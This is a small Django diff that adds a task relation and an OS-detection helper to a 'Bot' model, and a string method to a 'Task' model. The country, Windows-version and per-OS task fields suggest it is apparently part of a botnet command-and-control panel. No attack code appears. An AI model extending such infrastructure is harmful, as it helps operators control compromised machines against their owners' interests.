@@ -29,7 +29,13 @@ class Bot(models.Model):
 
     country = models.CharField(max_length=10)
 
+    tasks = models.ManyToManyField('Task')
+
     objects = models.Manager()
+
+    def get_win(self):
+        win = [_ for _ in [self.is_win8, self.is_win7, self.is_win10, self.is_win11, self.is_winxp] if _]
+        return win[0]
 
     class Meta:
         ordering = ['-date']
@@ -56,4 +62,8 @@ class Task(models.Model):
     winos = models.CharField(max_length=100)
     xoc = models.CharField(max_length=50)
 
+
     objects = models.Manager()
+
+    def __str__(self):
+        return f'{self.name} --- {self.winos}'
